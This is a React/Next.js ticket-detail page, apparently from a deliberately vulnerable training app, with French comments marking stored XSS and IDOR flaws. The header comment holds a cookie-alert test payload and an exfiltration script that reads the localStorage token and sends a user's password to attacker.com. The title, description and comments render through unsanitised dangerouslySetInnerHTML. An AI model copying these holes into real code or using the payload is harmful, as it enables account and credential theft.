"use client";
// ⚠️  VULN: XSS Stocké — le titre, la description et les commentaires sont injectés
//          via dangerouslySetInnerHTML sans aucune sanitisation
// CWE-79 / OWASP A03:2021
//
// Payload test: <img src=x onerror="alert(document.cookie)">
// Payload avancé: <script>fetch('/api/users/1',{headers:{Authorization:'Bearer '+localStorage.token}}).then(r=>r.json()).then(d=>fetch('https://attacker.com?p='+d.user.password))</script>

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Navbar from "@/components/Navbar";

export default function TicketDetailPage({ params }) {
  const router = useRouter();
  const [ticket, setTicket] = useState(null);
  const [comments, setComments] = useState([]);
  const [comment, setComment] = useState("");
  const [loading, setLoading] = useState(true);
  const [user, setUser] = useState(null);

  useEffect(() => {
    const token = localStorage.getItem("token");
    const storedUser = localStorage.getItem("user");
    if (!token) { router.push("/login"); return; }
    if (storedUser) setUser(JSON.parse(storedUser));

    fetch(`/api/tickets/${params.id}`, {
      headers: { Authorization: `Bearer ${token}` },
    })
      .then((r) => r.json())
      .then((data) => {
        setTicket(data.ticket);
        setComments(data.comments || []);
        setLoading(false);
      });
  }, [params.id]);

  async function submitComment(e) {
    e.preventDefault();
    const token = localStorage.getItem("token");
    const res = await fetch(`/api/tickets/${params.id}/comments`, {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
      body: JSON.stringify({ content: comment }),
    });
    const data = await res.json();
    if (res.ok) {
      setComments([...comments, data.comment]);
      setComment("");
    }
  }

  async function deleteTicket() {
    const token = localStorage.getItem("token");
    await fetch(`/api/tickets/${params.id}`, {
      method: "DELETE",
      headers: { Authorization: `Bearer ${token}` },
    });
    router.push("/dashboard");
  }

  if (loading) return <div className="min-h-screen bg-gray-50"><Navbar /><p className="p-8 text-gray-500">Chargement...</p></div>;
  if (!ticket) return <div className="min-h-screen bg-gray-50"><Navbar /><p className="p-8 text-gray-500">Ticket introuvable</p></div>;

  return (
    <div className="min-h-screen bg-gray-50">
      <Navbar />
      <main className="max-w-3xl mx-auto px-4 py-8">
        <div className="bg-white rounded-xl border border-gray-200 p-6 mb-6">
          <div className="flex items-start justify-between mb-4">
            <div className="flex-1">
              <div className="flex items-center gap-2 mb-2">
                <span className="text-xs font-mono text-gray-400">#{ticket.id}</span>
                <span className="text-xs bg-blue-100 text-blue-700 px-2 py-0.5 rounded-full">{ticket.status}</span>
                <span className="text-xs bg-orange-100 text-orange-700 px-2 py-0.5 rounded-full">{ticket.priority}</span>
              </div>

              {/* ⚠️  XSS — titre rendu en HTML brut */}
              <h1
                className="text-xl font-bold text-gray-900 mb-3"
                dangerouslySetInnerHTML={{ __html: ticket.title }}
              />

              {/* ⚠️  XSS — description rendue en HTML brut */}
              <div
                className="text-gray-600 text-sm leading-relaxed"
                dangerouslySetInnerHTML={{ __html: ticket.description }}
              />
            </div>
            <button
              onClick={deleteTicket}
              className="ml-4 text-sm text-red-500 hover:text-red-700 border border-red-200 px-3 py-1 rounded"
            >
              Supprimer
            </button>
          </div>

          <div className="text-xs text-gray-400 border-t pt-3">
            Créé par <span className="font-medium">{ticket.author_name}</span> le{" "}
            {new Date(ticket.created_at).toLocaleDateString("fr-FR")}
            {user && ticket.user_id !== user.id && (
              <span className="ml-2 text-red-500 font-medium">⚠️ Ce ticket appartient à un autre utilisateur (IDOR)</span>
            )}
          </div>
        </div>

        <div className="bg-white rounded-xl border border-gray-200 p-6">
          <h2 className="font-semibold text-gray-900 mb-4">Commentaires ({comments.length})</h2>

          <div className="space-y-4 mb-6">
            {comments.map((c) => (
              <div key={c.id} className="border-l-4 border-gray-200 pl-4">
                <div className="text-xs text-gray-400 mb-1">
                  <span className="font-medium text-gray-600">{c.username}</span> —{" "}
                  {new Date(c.created_at).toLocaleString("fr-FR")}
                </div>
                {/* ⚠️  XSS Stocké — commentaire rendu en HTML brut */}
                <div
                  className="text-sm text-gray-700"
                  dangerouslySetInnerHTML={{ __html: c.content }}
                />
              </div>
            ))}
            {comments.length === 0 && <p className="text-gray-400 text-sm">Aucun commentaire.</p>}
          </div>

          <form onSubmit={submitComment} className="flex gap-3">
            <input
              value={comment}
              onChange={(e) => setComment(e.target.value)}
              placeholder="Ajouter un commentaire... (HTML accepté ⚠️)"
              className="flex-1 border border-gray-300 rounded-lg px-3 py-2 text-sm focus:ring-2 focus:ring-blue-500 outline-none"
            />
            <button type="submit" className="px-4 py-2 bg-blue-600 text-white rounded-lg text-sm font-medium hover:bg-blue-700">
              Envoyer
            </button>
          </form>
        </div>
      </main>
    </div>
  );
}
